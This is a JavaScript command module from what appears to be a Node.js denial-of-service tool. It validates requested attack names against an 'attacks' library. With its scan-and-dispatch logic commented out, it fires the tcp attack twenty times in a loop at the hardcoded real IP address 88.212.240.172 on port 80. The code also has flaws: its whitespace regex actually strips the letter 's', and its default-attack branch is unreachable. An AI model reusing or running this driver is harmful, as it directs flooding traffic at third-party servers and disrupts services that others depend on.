const dns = require('../dns');
const scan = require('../scanner');

const CLIError = require('../error');

const attacks = require('../attacks');

module.exports = async (program) => {
  let possibleAttacks = program.attacks.replace(/s+/g, '').split(',');

  // Default attacks
  if (possibleAttacks.length === 0) {
    possibleAttacks = ['tcp'];
  }

  possibleAttacks.forEach(attack => {
    if (attack in attacks === false) {
      throw new CLIError({
        message: `attack "${attack}" is not implemented`,
        exitCode: 127
      });
    }
  });

  // const ips = await dns(program.args[0]);
  // const report = await scan(ips, program.ports);

  // const {ip, port} = report[0];

  // console.log(ip, port);

  for (let i = 0; i < 20; i++) {
    attacks.tcp('88.212.240.172', 80)
  }

  // possibleAttacks.forEach((name) => {
  //   report.forEach(({ip, port}) => {
  //     const attack = attacks[name];
  //     attack(ip, port).then(() => {
  //       console.log(1);
  //     });
  //   });
  // })
}
